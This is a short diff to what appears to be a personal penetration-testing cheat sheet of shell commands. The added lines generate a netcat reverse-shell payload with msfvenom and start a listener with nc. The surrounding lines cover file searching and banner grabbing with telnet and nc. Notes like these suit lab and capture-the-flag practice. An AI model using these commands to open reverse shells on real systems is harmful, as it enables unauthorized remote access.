@@ -21,6 +21,9 @@ find / -name file.txt         # Locate file or find . -name file.text
 or find / -name file.txt 2>/dev/null
 cat file.txt            # Read
 banner grabing
+-telnet 192.168.0.1
+-msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444 
+start listen nc -lnvp 444
 nc <ip> 22
 #Telnet
 telnet ip port
